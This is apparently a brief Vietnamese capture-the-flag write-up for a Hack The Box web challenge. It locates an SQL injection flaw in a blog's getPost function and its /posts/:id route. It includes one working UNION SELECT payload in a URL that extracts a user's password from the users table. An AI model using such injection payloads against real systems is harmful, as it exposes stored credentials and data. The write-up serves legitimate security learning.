
![Alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_tour_blog/img/Untitled5.png)

ở hàm __getPost__ trong tệp __database.js__ bị lỗi sqli
![Alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_tour_blog/img/Untitled1.png)

ở đường dẫn __/posts/:id__ dùng hàm getPost này
![Alt](https://github.com/magnetohvcs/ctf/blob/main/ctf-hackthebox/Auth0-CTF/web_tour_blog/img/Untitled2.png)

ta chỉ cần truy cập vào đường dẫn này là có thể lấy được flag __http://157.245.32.65:32516/posts/0' union select 1,2,3,password from users where username='flagbearer__

[source code của bài này](https://github.com/magnetohvcs/ctf/raw/main/ctf-hackthebox/Auth0-CTF/web_tour_blog/web_tour_blog.zip)
